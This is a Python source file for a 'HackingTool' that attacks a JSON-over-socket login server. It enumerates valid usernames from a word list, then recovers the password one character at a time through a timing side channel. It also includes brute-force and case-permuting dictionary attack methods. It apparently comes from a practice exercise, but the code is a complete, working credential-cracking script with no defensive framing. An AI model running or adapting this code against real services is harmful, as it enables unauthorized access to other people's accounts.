import sys
import socket
import string
import itertools
import json
from datetime import datetime


class HackingTool:
    def __init__(self, args):
        self.args = args
        self.address = None
        self.login = None
        self.password = ""

    def check_args(self) -> bool:
        """Checking starting arguments"""
        if len(self.args) != 3:
            return False
        self.address = (self.args[1], int(self.args[2]))
        return True

    def check_login(self):
        """Attempts to find correct login"""
        with socket.socket() as c_socket:
            c_socket.connect(self.address)
            for login in self.get_login():
                response = self.get_response(c_socket, self.convert_to_JSON(login).encode())
                if response[0] == "Wrong password!":
                    self.login = login
                    return self.hack(c_socket)
            return "There was no match with given logins"

    def convert_to_JSON(self, login: str, password=' ') -> str:
        """Converts result to JSON format"""
        return json.dumps({'login': login, 'password': password})

    def get_login(self):
        """Gets login from file"""
        with open('logins.txt', 'r') as read_file:
            for line in read_file:
                yield line.strip()

    def get_response(self, socket_obj: socket.socket, data: bytes) -> (str, int):
        """Gets JSON response and returns its message in string"""
        socket_obj.send(data)
        start = datetime.now()
        response = socket_obj.recv(1024).decode()  # Decoding server response in bytes to string
        finish = datetime.now()
        response = json.loads(response)
        return response['result'], (finish - start)

    def hack(self, socket_obj: socket.socket):
        """Trying to guess password using vulnerability that catching an exception takes the
        computer a long time, so there should be a delay in the server response when this exception takes place."""
        chars = string.ascii_letters + string.digits
        password = ""
        i = 0
        response_times = {}  # Dictionary to keep response time for each character
        while i < 10000:
            for char in chars:
                temp = password + char
                data = self.convert_to_JSON(self.login, temp).encode()
                response = self.get_response(socket_obj, data)
                if response[0] == "Connection success!":
                    return self.convert_to_JSON(self.login, temp)
                response_times[char] = response[1]
            # Adding char with highest response time to pass
            password += max(response_times, key=response_times.get)
            i += 1
        return None

    def brute_force(self):
        """Brute force method for cracking password, default password length is 7 chars using only lowercase
         letters and digits """
        letters = string.ascii_lowercase
        digits = string.digits
        with socket.socket() as c_socket:
            c_socket.connect(self.address)
            for plength in range(1, 7):
                for password in itertools.product(itertools.chain(letters, digits), repeat=plength):
                    data = "".join(password).encode()
                    if self.send_data(c_socket, data):
                        return data.decode()
            return "No match"

    def dictionary_method(self):
        """Dictionary method, using words from given file, also checking all possible combinations with
        upper and lowercase letters in given word"""
        with socket.socket() as c_socket:
            c_socket.connect(self.address)
            with open('passwords.txt', 'r') as passwords:
                for line in passwords:
                    data = line.rstrip('\n')
                    for i in itertools.product(
                            *((c.upper(), c.lower()) for c in data)):  # Using cartesian product with unpacking
                        product = "".join(i).encode()
                        if self.send_data(c_socket, product):
                            return product.decode()
                return "No match"

    def send_data(self, socket_obj: socket.socket, data: bytes) -> bool:
        """Returning socket response"""
        socket_obj.send(data)
        response = socket_obj.recv(1024).decode()  # Decoding server response in bytes to string
        if response == "Connection success!":
            return True
        return False

    def main(self):
        if self.check_args():
            print(self.check_login())

        else:
            print("Bad arguments")


if __name__ == "__main__":
    hack = HackingTool(sys.argv)
    hack.main()
